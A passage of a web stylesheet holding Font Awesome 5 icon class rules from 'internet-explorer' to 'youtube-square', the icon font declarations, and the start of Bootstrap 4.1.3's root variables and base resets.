    }

    .fa-internet-explorer:before {
      content: "\f26b"
    }

    .fa-ioxhost:before {
      content: "\f208"
    }

    .fa-italic:before {
      content: "\f033"
    }

    .fa-itunes:before {
      content: "\f3b4"
    }

    .fa-itunes-note:before {
      content: "\f3b5"
    }

    .fa-java:before {
      content: "\f4e4"
    }

    .fa-jedi-order:before {
      content: "\f50e"
    }

    .fa-jenkins:before {
      content: "\f3b6"
    }

    .fa-joget:before {
      content: "\f3b7"
    }

    .fa-joomla:before {
      content: "\f1aa"
    }

    .fa-js:before {
      content: "\f3b8"
    }

    .fa-js-square:before {
      content: "\f3b9"
    }

    .fa-jsfiddle:before {
      content: "\f1cc"
    }

    .fa-key:before {
      content: "\f084"
    }

    .fa-keybase:before {
      content: "\f4f5"
    }

    .fa-keyboard:before {
      content: "\f11c"
    }

    .fa-keycdn:before {
      content: "\f3ba"
    }

    .fa-kickstarter:before {
      content: "\f3bb"
    }

    .fa-kickstarter-k:before {
      content: "\f3bc"
    }

    .fa-kiwi-bird:before {
      content: "\f535"
    }

    .fa-korvue:before {
      content: "\f42f"
    }

    .fa-language:before {
      content: "\f1ab"
    }

    .fa-laptop:before {
      content: "\f109"
    }

    .fa-laravel:before {
      content: "\f3bd"
    }

    .fa-lastfm:before {
      content: "\f202"
    }

    .fa-lastfm-square:before {
      content: "\f203"
    }

    .fa-leaf:before {
      content: "\f06c"
    }

    .fa-leanpub:before {
      content: "\f212"
    }

    .fa-lemon:before {
      content: "\f094"
    }

    .fa-less:before {
      content: "\f41d"
    }

    .fa-less-than:before {
      content: "\f536"
    }

    .fa-less-than-equal:before {
      content: "\f537"
    }

    .fa-level-down-alt:before {
      content: "\f3be"
    }

    .fa-level-up-alt:before {
      content: "\f3bf"
    }

    .fa-life-ring:before {
      content: "\f1cd"
    }

    .fa-lightbulb:before {
      content: "\f0eb"
    }

    .fa-line:before {
      content: "\f3c0"
    }

    .fa-link:before {
      content: "\f0c1"
    }

    .fa-linkedin:before {
      content: "\f08c"
    }

    .fa-linkedin-in:before {
      content: "\f0e1"
    }

    .fa-linode:before {
      content: "\f2b8"
    }

    .fa-linux:before {
      content: "\f17c"
    }

    .fa-lira-sign:before {
      content: "\f195"
    }

    .fa-list:before {
      content: "\f03a"
    }

    .fa-list-alt:before {
      content: "\f022"
    }

    .fa-list-ol:before {
      content: "\f0cb"
    }

    .fa-list-ul:before {
      content: "\f0ca"
    }

    .fa-location-arrow:before {
      content: "\f124"
    }

    .fa-lock:before {
      content: "\f023"
    }

    .fa-lock-open:before {
      content: "\f3c1"
    }

    .fa-long-arrow-alt-down:before {
      content: "\f309"
    }

    .fa-long-arrow-alt-left:before {
      content: "\f30a"
    }

    .fa-long-arrow-alt-right:before {
      content: "\f30b"
    }

    .fa-long-arrow-alt-up:before {
      content: "\f30c"
    }

    .fa-low-vision:before {
      content: "\f2a8"
    }

    .fa-lyft:before {
      content: "\f3c3"
    }

    .fa-magento:before {
      content: "\f3c4"
    }

    .fa-magic:before {
      content: "\f0d0"
    }

    .fa-magnet:before {
      content: "\f076"
    }

    .fa-male:before {
      content: "\f183"
    }

    .fa-mandalorian:before {
      content: "\f50f"
    }

    .fa-map:before {
      content: "\f279"
    }

    .fa-map-marker:before {
      content: "\f041"
    }

    .fa-map-marker-alt:before {
      content: "\f3c5"
    }

    .fa-map-pin:before {
      content: "\f276"
    }

    .fa-map-signs:before {
      content: "\f277"
    }

    .fa-mars:before {
      content: "\f222"
    }

    .fa-mars-double:before {
      content: "\f227"
    }

    .fa-mars-stroke:before {
      content: "\f229"
    }

    .fa-mars-stroke-h:before {
      content: "\f22b"
    }

    .fa-mars-stroke-v:before {
      content: "\f22a"
    }

    .fa-mastodon:before {
      content: "\f4f6"
    }

    .fa-maxcdn:before {
      content: "\f136"
    }

    .fa-medapps:before {
      content: "\f3c6"
    }

    .fa-medium:before {
      content: "\f23a"
    }

    .fa-medium-m:before {
      content: "\f3c7"
    }

    .fa-medkit:before {
      content: "\f0fa"
    }

    .fa-medrt:before {
      content: "\f3c8"
    }

    .fa-meetup:before {
      content: "\f2e0"
    }

    .fa-meh:before {
      content: "\f11a"
    }

    .fa-memory:before {
      content: "\f538"
    }

    .fa-mercury:before {
      content: "\f223"
    }

    .fa-microchip:before {
      content: "\f2db"
    }

    .fa-microphone:before {
      content: "\f130"
    }

    .fa-microphone-alt:before {
      content: "\f3c9"
    }

    .fa-microphone-alt-slash:before {
      content: "\f539"
    }

    .fa-microphone-slash:before {
      content: "\f131"
    }

    .fa-microsoft:before {
      content: "\f3ca"
    }

    .fa-minus:before {
      content: "\f068"
    }

    .fa-minus-circle:before {
      content: "\f056"
    }

    .fa-minus-square:before {
      content: "\f146"
    }

    .fa-mix:before {
      content: "\f3cb"
    }

    .fa-mixcloud:before {
      content: "\f289"
    }

    .fa-mizuni:before {
      content: "\f3cc"
    }

    .fa-mobile:before {
      content: "\f10b"
    }

    .fa-mobile-alt:before {
      content: "\f3cd"
    }

    .fa-modx:before {
      content: "\f285"
    }

    .fa-monero:before {
      content: "\f3d0"
    }

    .fa-money-bill:before {
      content: "\f0d6"
    }

    .fa-money-bill-alt:before {
      content: "\f3d1"
    }

    .fa-money-bill-wave:before {
      content: "\f53a"
    }

    .fa-money-bill-wave-alt:before {
      content: "\f53b"
    }

    .fa-money-check:before {
      content: "\f53c"
    }

    .fa-money-check-alt:before {
      content: "\f53d"
    }

    .fa-moon:before {
      content: "\f186"
    }

    .fa-motorcycle:before {
      content: "\f21c"
    }

    .fa-mouse-pointer:before {
      content: "\f245"
    }

    .fa-music:before {
      content: "\f001"
    }

    .fa-napster:before {
      content: "\f3d2"
    }

    .fa-neuter:before {
      content: "\f22c"
    }

    .fa-newspaper:before {
      content: "\f1ea"
    }

    .fa-nintendo-switch:before {
      content: "\f418"
    }

    .fa-node:before {
      content: "\f419"
    }

    .fa-node-js:before {
      content: "\f3d3"
    }

    .fa-not-equal:before {
      content: "\f53e"
    }

    .fa-notes-medical:before {
      content: "\f481"
    }

    .fa-npm:before {
      content: "\f3d4"
    }

    .fa-ns8:before {
      content: "\f3d5"
    }

    .fa-nutritionix:before {
      content: "\f3d6"
    }

    .fa-object-group:before {
      content: "\f247"
    }

    .fa-object-ungroup:before {
      content: "\f248"
    }

    .fa-odnoklassniki:before {
      content: "\f263"
    }

    .fa-odnoklassniki-square:before {
      content: "\f264"
    }

    .fa-old-republic:before {
      content: "\f510"
    }

    .fa-opencart:before {
      content: "\f23d"
    }

    .fa-openid:before {
      content: "\f19b"
    }

    .fa-opera:before {
      content: "\f26a"
    }

    .fa-optin-monster:before {
      content: "\f23c"
    }

    .fa-osi:before {
      content: "\f41a"
    }

    .fa-outdent:before {
      content: "\f03b"
    }

    .fa-page4:before {
      content: "\f3d7"
    }

    .fa-pagelines:before {
      content: "\f18c"
    }

    .fa-paint-brush:before {
      content: "\f1fc"
    }

    .fa-palette:before {
      content: "\f53f"
    }

    .fa-palfed:before {
      content: "\f3d8"
    }

    .fa-pallet:before {
      content: "\f482"
    }

    .fa-paper-plane:before {
      content: "\f1d8"
    }

    .fa-paperclip:before {
      content: "\f0c6"
    }

    .fa-parachute-box:before {
      content: "\f4cd"
    }

    .fa-paragraph:before {
      content: "\f1dd"
    }

    .fa-parking:before {
      content: "\f540"
    }

    .fa-paste:before {
      content: "\f0ea"
    }

    .fa-patreon:before {
      content: "\f3d9"
    }

    .fa-pause:before {
      content: "\f04c"
    }

    .fa-pause-circle:before {
      content: "\f28b"
    }

    .fa-paw:before {
      content: "\f1b0"
    }

    .fa-paypal:before {
      content: "\f1ed"
    }

    .fa-pen-square:before {
      content: "\f14b"
    }

    .fa-pencil-alt:before {
      content: "\f303"
    }

    .fa-people-carry:before {
      content: "\f4ce"
    }

    .fa-percent:before {
      content: "\f295"
    }

    .fa-percentage:before {
      content: "\f541"
    }

    .fa-periscope:before {
      content: "\f3da"
    }

    .fa-phabricator:before {
      content: "\f3db"
    }

    .fa-phoenix-framework:before {
      content: "\f3dc"
    }

    .fa-phoenix-squadron:before {
      content: "\f511"
    }

    .fa-phone:before {
      content: "\f095"
    }

    .fa-phone-slash:before {
      content: "\f3dd"
    }

    .fa-phone-square:before {
      content: "\f098"
    }

    .fa-phone-volume:before {
      content: "\f2a0"
    }

    .fa-php:before {
      content: "\f457"
    }

    .fa-pied-piper:before {
      content: "\f2ae"
    }

    .fa-pied-piper-alt:before {
      content: "\f1a8"
    }

    .fa-pied-piper-hat:before {
      content: "\f4e5"
    }

    .fa-pied-piper-pp:before {
      content: "\f1a7"
    }

    .fa-piggy-bank:before {
      content: "\f4d3"
    }

    .fa-pills:before {
      content: "\f484"
    }

    .fa-pinterest:before {
      content: "\f0d2"
    }

    .fa-pinterest-p:before {
      content: "\f231"
    }

    .fa-pinterest-square:before {
      content: "\f0d3"
    }

    .fa-plane:before {
      content: "\f072"
    }

    .fa-play:before {
      content: "\f04b"
    }

    .fa-play-circle:before {
      content: "\f144"
    }

    .fa-playstation:before {
      content: "\f3df"
    }

    .fa-plug:before {
      content: "\f1e6"
    }

    .fa-plus:before {
      content: "\f067"
    }

    .fa-plus-circle:before {
      content: "\f055"
    }

    .fa-plus-square:before {
      content: "\f0fe"
    }

    .fa-podcast:before {
      content: "\f2ce"
    }

    .fa-poo:before {
      content: "\f2fe"
    }

    .fa-portrait:before {
      content: "\f3e0"
    }

    .fa-pound-sign:before {
      content: "\f154"
    }

    .fa-power-off:before {
      content: "\f011"
    }

    .fa-prescription-bottle:before {
      content: "\f485"
    }

    .fa-prescription-bottle-alt:before {
      content: "\f486"
    }

    .fa-print:before {
      content: "\f02f"
    }

    .fa-procedures:before {
      content: "\f487"
    }

    .fa-product-hunt:before {
      content: "\f288"
    }

    .fa-project-diagram:before {
      content: "\f542"
    }

    .fa-pushed:before {
      content: "\f3e1"
    }

    .fa-puzzle-piece:before {
      content: "\f12e"
    }

    .fa-python:before {
      content: "\f3e2"
    }

    .fa-qq:before {
      content: "\f1d6"
    }

    .fa-qrcode:before {
      content: "\f029"
    }

    .fa-question:before {
      content: "\f128"
    }

    .fa-question-circle:before {
      content: "\f059"
    }

    .fa-quidditch:before {
      content: "\f458"
    }

    .fa-quinscape:before {
      content: "\f459"
    }

    .fa-quora:before {
      content: "\f2c4"
    }

    .fa-quote-left:before {
      content: "\f10d"
    }

    .fa-quote-right:before {
      content: "\f10e"
    }

    .fa-r-project:before {
      content: "\f4f7"
    }

    .fa-random:before {
      content: "\f074"
    }

    .fa-ravelry:before {
      content: "\f2d9"
    }

    .fa-react:before {
      content: "\f41b"
    }

    .fa-readme:before {
      content: "\f4d5"
    }

    .fa-rebel:before {
      content: "\f1d0"
    }

    .fa-receipt:before {
      content: "\f543"
    }

    .fa-recycle:before {
      content: "\f1b8"
    }

    .fa-red-river:before {
      content: "\f3e3"
    }

    .fa-reddit:before {
      content: "\f1a1"
    }

    .fa-reddit-alien:before {
      content: "\f281"
    }

    .fa-reddit-square:before {
      content: "\f1a2"
    }

    .fa-redo:before {
      content: "\f01e"
    }

    .fa-redo-alt:before {
      content: "\f2f9"
    }

    .fa-registered:before {
      content: "\f25d"
    }

    .fa-rendact:before {
      content: "\f3e4"
    }

    .fa-renren:before {
      content: "\f18b"
    }

    .fa-reply:before {
      content: "\f3e5"
    }

    .fa-reply-all:before {
      content: "\f122"
    }

    .fa-replyd:before {
      content: "\f3e6"
    }

    .fa-researchgate:before {
      content: "\f4f8"
    }

    .fa-resolving:before {
      content: "\f3e7"
    }

    .fa-retweet:before {
      content: "\f079"
    }

    .fa-ribbon:before {
      content: "\f4d6"
    }

    .fa-road:before {
      content: "\f018"
    }

    .fa-robot:before {
      content: "\f544"
    }

    .fa-rocket:before {
      content: "\f135"
    }

    .fa-rocketchat:before {
      content: "\f3e8"
    }

    .fa-rockrms:before {
      content: "\f3e9"
    }

    .fa-rss:before {
      content: "\f09e"
    }

    .fa-rss-square:before {
      content: "\f143"
    }

    .fa-ruble-sign:before {
      content: "\f158"
    }

    .fa-ruler:before {
      content: "\f545"
    }

    .fa-ruler-combined:before {
      content: "\f546"
    }

    .fa-ruler-horizontal:before {
      content: "\f547"
    }

    .fa-ruler-vertical:before {
      content: "\f548"
    }

    .fa-rupee-sign:before {
      content: "\f156"
    }

    .fa-safari:before {
      content: "\f267"
    }

    .fa-sass:before {
      content: "\f41e"
    }

    .fa-save:before {
      content: "\f0c7"
    }

    .fa-schlix:before {
      content: "\f3ea"
    }

    .fa-school:before {
      content: "\f549"
    }

    .fa-screwdriver:before {
      content: "\f54a"
    }

    .fa-scribd:before {
      content: "\f28a"
    }

    .fa-search:before {
      content: "\f002"
    }

    .fa-search-minus:before {
      content: "\f010"
    }

    .fa-search-plus:before {
      content: "\f00e"
    }

    .fa-searchengin:before {
      content: "\f3eb"
    }

    .fa-seedling:before {
      content: "\f4d8"
    }

    .fa-sellcast:before {
      content: "\f2da"
    }

    .fa-sellsy:before {
      content: "\f213"
    }

    .fa-server:before {
      content: "\f233"
    }

    .fa-servicestack:before {
      content: "\f3ec"
    }

    .fa-share:before {
      content: "\f064"
    }

    .fa-share-alt:before {
      content: "\f1e0"
    }

    .fa-share-alt-square:before {
      content: "\f1e1"
    }

    .fa-share-square:before {
      content: "\f14d"
    }

    .fa-shekel-sign:before {
      content: "\f20b"
    }

    .fa-shield-alt:before {
      content: "\f3ed"
    }

    .fa-ship:before {
      content: "\f21a"
    }

    .fa-shipping-fast:before {
      content: "\f48b"
    }

    .fa-shirtsinbulk:before {
      content: "\f214"
    }

    .fa-shoe-prints:before {
      content: "\f54b"
    }

    .fa-shopping-bag:before {
      content: "\f290"
    }

    .fa-shopping-basket:before {
      content: "\f291"
    }

    .fa-shopping-cart:before {
      content: "\f07a"
    }

    .fa-shower:before {
      content: "\f2cc"
    }

    .fa-sign:before {
      content: "\f4d9"
    }

    .fa-sign-in-alt:before {
      content: "\f2f6"
    }

    .fa-sign-language:before {
      content: "\f2a7"
    }

    .fa-sign-out-alt:before {
      content: "\f2f5"
    }

    .fa-signal:before {
      content: "\f012"
    }

    .fa-simplybuilt:before {
      content: "\f215"
    }

    .fa-sistrix:before {
      content: "\f3ee"
    }

    .fa-sitemap:before {
      content: "\f0e8"
    }

    .fa-sith:before {
      content: "\f512"
    }

    .fa-skull:before {
      content: "\f54c"
    }

    .fa-skyatlas:before {
      content: "\f216"
    }

    .fa-skype:before {
      content: "\f17e"
    }

    .fa-slack:before {
      content: "\f198"
    }

    .fa-slack-hash:before {
      content: "\f3ef"
    }

    .fa-sliders-h:before {
      content: "\f1de"
    }

    .fa-slideshare:before {
      content: "\f1e7"
    }

    .fa-smile:before {
      content: "\f118"
    }

    .fa-smoking:before {
      content: "\f48d"
    }

    .fa-smoking-ban:before {
      content: "\f54d"
    }

    .fa-snapchat:before {
      content: "\f2ab"
    }

    .fa-snapchat-ghost:before {
      content: "\f2ac"
    }

    .fa-snapchat-square:before {
      content: "\f2ad"
    }

    .fa-snowflake:before {
      content: "\f2dc"
    }

    .fa-sort:before {
      content: "\f0dc"
    }

    .fa-sort-alpha-down:before {
      content: "\f15d"
    }

    .fa-sort-alpha-up:before {
      content: "\f15e"
    }

    .fa-sort-amount-down:before {
      content: "\f160"
    }

    .fa-sort-amount-up:before {
      content: "\f161"
    }

    .fa-sort-down:before {
      content: "\f0dd"
    }

    .fa-sort-numeric-down:before {
      content: "\f162"
    }

    .fa-sort-numeric-up:before {
      content: "\f163"
    }

    .fa-sort-up:before {
      content: "\f0de"
    }

    .fa-soundcloud:before {
      content: "\f1be"
    }

    .fa-space-shuttle:before {
      content: "\f197"
    }

    .fa-speakap:before {
      content: "\f3f3"
    }

    .fa-spinner:before {
      content: "\f110"
    }

    .fa-spotify:before {
      content: "\f1bc"
    }

    .fa-square:before {
      content: "\f0c8"
    }

    .fa-square-full:before {
      content: "\f45c"
    }

    .fa-stack-exchange:before {
      content: "\f18d"
    }

    .fa-stack-overflow:before {
      content: "\f16c"
    }

    .fa-star:before {
      content: "\f005"
    }

    .fa-star-half:before {
      content: "\f089"
    }

    .fa-staylinked:before {
      content: "\f3f5"
    }

    .fa-steam:before {
      content: "\f1b6"
    }

    .fa-steam-square:before {
      content: "\f1b7"
    }

    .fa-steam-symbol:before {
      content: "\f3f6"
    }

    .fa-step-backward:before {
      content: "\f048"
    }

    .fa-step-forward:before {
      content: "\f051"
    }

    .fa-stethoscope:before {
      content: "\f0f1"
    }

    .fa-sticker-mule:before {
      content: "\f3f7"
    }

    .fa-sticky-note:before {
      content: "\f249"
    }

    .fa-stop:before {
      content: "\f04d"
    }

    .fa-stop-circle:before {
      content: "\f28d"
    }

    .fa-stopwatch:before {
      content: "\f2f2"
    }

    .fa-store:before {
      content: "\f54e"
    }

    .fa-store-alt:before {
      content: "\f54f"
    }

    .fa-strava:before {
      content: "\f428"
    }

    .fa-stream:before {
      content: "\f550"
    }

    .fa-street-view:before {
      content: "\f21d"
    }

    .fa-strikethrough:before {
      content: "\f0cc"
    }

    .fa-stripe:before {
      content: "\f429"
    }

    .fa-stripe-s:before {
      content: "\f42a"
    }

    .fa-stroopwafel:before {
      content: "\f551"
    }

    .fa-studiovinari:before {
      content: "\f3f8"
    }

    .fa-stumbleupon:before {
      content: "\f1a4"
    }

    .fa-stumbleupon-circle:before {
      content: "\f1a3"
    }

    .fa-subscript:before {
      content: "\f12c"
    }

    .fa-subway:before {
      content: "\f239"
    }

    .fa-suitcase:before {
      content: "\f0f2"
    }

    .fa-sun:before {
      content: "\f185"
    }

    .fa-superpowers:before {
      content: "\f2dd"
    }

    .fa-superscript:before {
      content: "\f12b"
    }

    .fa-supple:before {
      content: "\f3f9"
    }

    .fa-sync:before {
      content: "\f021"
    }

    .fa-sync-alt:before {
      content: "\f2f1"
    }

    .fa-syringe:before {
      content: "\f48e"
    }

    .fa-table:before {
      content: "\f0ce"
    }

    .fa-table-tennis:before {
      content: "\f45d"
    }

    .fa-tablet:before {
      content: "\f10a"
    }

    .fa-tablet-alt:before {
      content: "\f3fa"
    }

    .fa-tablets:before {
      content: "\f490"
    }

    .fa-tachometer-alt:before {
      content: "\f3fd"
    }

    .fa-tag:before {
      content: "\f02b"
    }

    .fa-tags:before {
      content: "\f02c"
    }

    .fa-tape:before {
      content: "\f4db"
    }

    .fa-tasks:before {
      content: "\f0ae"
    }

    .fa-taxi:before {
      content: "\f1ba"
    }

    .fa-teamspeak:before {
      content: "\f4f9"
    }

    .fa-telegram:before {
      content: "\f2c6"
    }

    .fa-telegram-plane:before {
      content: "\f3fe"
    }

    .fa-tencent-weibo:before {
      content: "\f1d5"
    }

    .fa-terminal:before {
      content: "\f120"
    }

    .fa-text-height:before {
      content: "\f034"
    }

    .fa-text-width:before {
      content: "\f035"
    }

    .fa-th:before {
      content: "\f00a"
    }

    .fa-th-large:before {
      content: "\f009"
    }

    .fa-th-list:before {
      content: "\f00b"
    }

    .fa-themeisle:before {
      content: "\f2b2"
    }

    .fa-thermometer:before {
      content: "\f491"
    }

    .fa-thermometer-empty:before {
      content: "\f2cb"
    }

    .fa-thermometer-full:before {
      content: "\f2c7"
    }

    .fa-thermometer-half:before {
      content: "\f2c9"
    }

    .fa-thermometer-quarter:before {
      content: "\f2ca"
    }

    .fa-thermometer-three-quarters:before {
      content: "\f2c8"
    }

    .fa-thumbs-down:before {
      content: "\f165"
    }

    .fa-thumbs-up:before {
      content: "\f164"
    }

    .fa-thumbtack:before {
      content: "\f08d"
    }

    .fa-ticket-alt:before {
      content: "\f3ff"
    }

    .fa-times:before {
      content: "\f00d"
    }

    .fa-times-circle:before {
      content: "\f057"
    }

    .fa-tint:before {
      content: "\f043"
    }

    .fa-toggle-off:before {
      content: "\f204"
    }

    .fa-toggle-on:before {
      content: "\f205"
    }

    .fa-toolbox:before {
      content: "\f552"
    }

    .fa-trade-federation:before {
      content: "\f513"
    }

    .fa-trademark:before {
      content: "\f25c"
    }

    .fa-train:before {
      content: "\f238"
    }

    .fa-transgender:before {
      content: "\f224"
    }

    .fa-transgender-alt:before {
      content: "\f225"
    }

    .fa-trash:before {
      content: "\f1f8"
    }

    .fa-trash-alt:before {
      content: "\f2ed"
    }

    .fa-tree:before {
      content: "\f1bb"
    }

    .fa-trello:before {
      content: "\f181"
    }

    .fa-tripadvisor:before {
      content: "\f262"
    }

    .fa-trophy:before {
      content: "\f091"
    }

    .fa-truck:before {
      content: "\f0d1"
    }

    .fa-truck-loading:before {
      content: "\f4de"
    }

    .fa-truck-moving:before {
      content: "\f4df"
    }

    .fa-tshirt:before {
      content: "\f553"
    }

    .fa-tty:before {
      content: "\f1e4"
    }

    .fa-tumblr:before {
      content: "\f173"
    }

    .fa-tumblr-square:before {
      content: "\f174"
    }

    .fa-tv:before {
      content: "\f26c"
    }

    .fa-twitch:before {
      content: "\f1e8"
    }

    .fa-twitter:before {
      content: "\f099"
    }

    .fa-twitter-square:before {
      content: "\f081"
    }

    .fa-typo3:before {
      content: "\f42b"
    }

    .fa-uber:before {
      content: "\f402"
    }

    .fa-uikit:before {
      content: "\f403"
    }

    .fa-umbrella:before {
      content: "\f0e9"
    }

    .fa-underline:before {
      content: "\f0cd"
    }

    .fa-undo:before {
      content: "\f0e2"
    }

    .fa-undo-alt:before {
      content: "\f2ea"
    }

    .fa-uniregistry:before {
      content: "\f404"
    }

    .fa-universal-access:before {
      content: "\f29a"
    }

    .fa-university:before {
      content: "\f19c"
    }

    .fa-unlink:before {
      content: "\f127"
    }

    .fa-unlock:before {
      content: "\f09c"
    }

    .fa-unlock-alt:before {
      content: "\f13e"
    }

    .fa-untappd:before {
      content: "\f405"
    }

    .fa-upload:before {
      content: "\f093"
    }

    .fa-usb:before {
      content: "\f287"
    }

    .fa-user:before {
      content: "\f007"
    }

    .fa-user-alt:before {
      content: "\f406"
    }

    .fa-user-alt-slash:before {
      content: "\f4fa"
    }

    .fa-user-astronaut:before {
      content: "\f4fb"
    }

    .fa-user-check:before {
      content: "\f4fc"
    }

    .fa-user-circle:before {
      content: "\f2bd"
    }

    .fa-user-clock:before {
      content: "\f4fd"
    }

    .fa-user-cog:before {
      content: "\f4fe"
    }

    .fa-user-edit:before {
      content: "\f4ff"
    }

    .fa-user-friends:before {
      content: "\f500"
    }

    .fa-user-graduate:before {
      content: "\f501"
    }

    .fa-user-lock:before {
      content: "\f502"
    }

    .fa-user-md:before {
      content: "\f0f0"
    }

    .fa-user-minus:before {
      content: "\f503"
    }

    .fa-user-ninja:before {
      content: "\f504"
    }

    .fa-user-plus:before {
      content: "\f234"
    }

    .fa-user-secret:before {
      content: "\f21b"
    }

    .fa-user-shield:before {
      content: "\f505"
    }

    .fa-user-slash:before {
      content: "\f506"
    }

    .fa-user-tag:before {
      content: "\f507"
    }

    .fa-user-tie:before {
      content: "\f508"
    }

    .fa-user-times:before {
      content: "\f235"
    }

    .fa-users:before {
      content: "\f0c0"
    }

    .fa-users-cog:before {
      content: "\f509"
    }

    .fa-ussunnah:before {
      content: "\f407"
    }

    .fa-utensil-spoon:before {
      content: "\f2e5"
    }

    .fa-utensils:before {
      content: "\f2e7"
    }

    .fa-vaadin:before {
      content: "\f408"
    }

    .fa-venus:before {
      content: "\f221"
    }

    .fa-venus-double:before {
      content: "\f226"
    }

    .fa-venus-mars:before {
      content: "\f228"
    }

    .fa-viacoin:before {
      content: "\f237"
    }

    .fa-viadeo:before {
      content: "\f2a9"
    }

    .fa-viadeo-square:before {
      content: "\f2aa"
    }

    .fa-vial:before {
      content: "\f492"
    }

    .fa-vials:before {
      content: "\f493"
    }

    .fa-viber:before {
      content: "\f409"
    }

    .fa-video:before {
      content: "\f03d"
    }

    .fa-video-slash:before {
      content: "\f4e2"
    }

    .fa-vimeo:before {
      content: "\f40a"
    }

    .fa-vimeo-square:before {
      content: "\f194"
    }

    .fa-vimeo-v:before {
      content: "\f27d"
    }

    .fa-vine:before {
      content: "\f1ca"
    }

    .fa-vk:before {
      content: "\f189"
    }

    .fa-vnv:before {
      content: "\f40b"
    }

    .fa-volleyball-ball:before {
      content: "\f45f"
    }

    .fa-volume-down:before {
      content: "\f027"
    }

    .fa-volume-off:before {
      content: "\f026"
    }

    .fa-volume-up:before {
      content: "\f028"
    }

    .fa-vuejs:before {
      content: "\f41f"
    }

    .fa-walking:before {
      content: "\f554"
    }

    .fa-wallet:before {
      content: "\f555"
    }

    .fa-warehouse:before {
      content: "\f494"
    }

    .fa-weibo:before {
      content: "\f18a"
    }

    .fa-weight:before {
      content: "\f496"
    }

    .fa-weixin:before {
      content: "\f1d7"
    }

    .fa-whatsapp:before {
      content: "\f232"
    }

    .fa-whatsapp-square:before {
      content: "\f40c"
    }

    .fa-wheelchair:before {
      content: "\f193"
    }

    .fa-whmcs:before {
      content: "\f40d"
    }

    .fa-wifi:before {
      content: "\f1eb"
    }

    .fa-wikipedia-w:before {
      content: "\f266"
    }

    .fa-window-close:before {
      content: "\f410"
    }

    .fa-window-maximize:before {
      content: "\f2d0"
    }

    .fa-window-minimize:before {
      content: "\f2d1"
    }

    .fa-window-restore:before {
      content: "\f2d2"
    }

    .fa-windows:before {
      content: "\f17a"
    }

    .fa-wine-glass:before {
      content: "\f4e3"
    }

    .fa-wolf-pack-battalion:before {
      content: "\f514"
    }

    .fa-won-sign:before {
      content: "\f159"
    }

    .fa-wordpress:before {
      content: "\f19a"
    }

    .fa-wordpress-simple:before {
      content: "\f411"
    }

    .fa-wpbeginner:before {
      content: "\f297"
    }

    .fa-wpexplorer:before {
      content: "\f2de"
    }

    .fa-wpforms:before {
      content: "\f298"
    }

    .fa-wrench:before {
      content: "\f0ad"
    }

    .fa-x-ray:before {
      content: "\f497"
    }

    .fa-xbox:before {
      content: "\f412"
    }

    .fa-xing:before {
      content: "\f168"
    }

    .fa-xing-square:before {
      content: "\f169"
    }

    .fa-y-combinator:before {
      content: "\f23b"
    }

    .fa-yahoo:before {
      content: "\f19e"
    }

    .fa-yandex:before {
      content: "\f413"
    }

    .fa-yandex-international:before {
      content: "\f414"
    }

    .fa-yelp:before {
      content: "\f1e9"
    }

    .fa-yen-sign:before {
      content: "\f157"
    }

    .fa-yoast:before {
      content: "\f2b1"
    }

    .fa-youtube:before {
      content: "\f167"
    }

    .fa-youtube-square:before {
      content: "\f431"
    }

    .sr-only {
      border: 0;
      clip: rect(0, 0, 0, 0);
      height: 1px;
      margin: -1px;
      overflow: hidden;
      padding: 0;
      position: absolute;
      width: 1px
    }

    .sr-only-focusable:active,
    .sr-only-focusable:focus {
      clip: auto;
      height: auto;
      margin: 0;
      overflow: visible;
      position: static;
      width: auto
    }

    @font-face {
      font-family: Font Awesome\ 5 Brands;
      font-style: normal;
      font-weight: 400;
      src: url(fa-brands-400.eot);
      src: url(fa-brands-400d41dd41d.eot?#iefix) format("embedded-opentype"), url(fa-brands-400.woff) format("woff2"), url(fa-brands-400.woff) format("woff"), url(fa-brands-400.ttf) format("truetype"), url(fa-brands-400.svg) format("svg")
    }

    .fab {
      font-family: Font Awesome\ 5 Brands
    }

    @font-face {
      font-family: Font Awesome\ 5 Free;
      font-style: normal;
      font-weight: 400;
      src: url(fa-regular-400.eot);
      src: url(fa-regular-400d41dd41d.eot?#iefix) format("embedded-opentype"), url(fa-regular-400.woff) format("woff2"), url(fa-regular-400.woff) format("woff"), url(fa-regular-400.ttf) format("truetype"), url(fa-regular-400.svg) format("svg")
    }

    .far {
      font-weight: 400
    }

    @font-face {
      font-family: Font Awesome\ 5 Free;
      font-style: normal;
      font-weight: 900;
      src: url(fa-solid-900.eot);
      src: url(fa-solid-900d41dd41d.eot?#iefix) format("embedded-opentype"), url(fa-solid-900.woff) format("woff2"), url(fa-solid-900.woff) format("woff"), url(fa-solid-900.ttf) format("truetype"), url(fa-solid-900.svg) format("svg")
    }

    .fa,
    .far,
    .fas {
      font-family: Font Awesome\ 5 Free
    }

    .fa,
    .fas {
      font-weight: 900
    }

    /*!
 * Bootstrap v4.1.3 (https://getbootstrap.com/)
 * Copyright 2011-2018 The Bootstrap Authors
 * Copyright 2011-2018 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */
    :root {
      --blue: #007bff;
      --indigo: #6610f2;
      --purple: #6f42c1;
      --pink: #e83e8c;
      --red: #dc3545;
      --orange: #fd7e14;
      --yellow: #ffc107;
      --green: #28a745;
      --teal: #20c997;
      --cyan: #17a2b8;
      --white: #fff;
      --gray: #6c757d;
      --gray-dark: #343a40;
      --primary: #007bff;
      --secondary: #6c757d;
      --success: #28a745;
      --info: #17a2b8;
      --warning: #ffc107;
      --danger: #dc3545;
      --light: #f8f9fa;
      --dark: #343a40;
      --breakpoint-xs: 0;
      --breakpoint-sm: 576px;
      --breakpoint-md: 768px;
      --breakpoint-lg: 992px;
      --breakpoint-xl: 1200px;
      --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
    }

    *,
    ::after,
    ::before {
      box-sizing: border-box
    }

    html {
      font-family: sans-serif;
      line-height: 1.15;
      -webkit-text-size-adjust: 100%;
      -ms-text-size-adjust: 100%;
      -ms-overflow-style: scrollbar;
      -webkit-tap-highlight-color: transparent
    }

    @-ms-viewport {
      width: device-width
    }

    article,
    aside,
    figcaption,
    figure,
    footer,
    header,
    hgroup,
    main,
    nav,
    section {
      display: block
    }

    body {
      margin: 0;
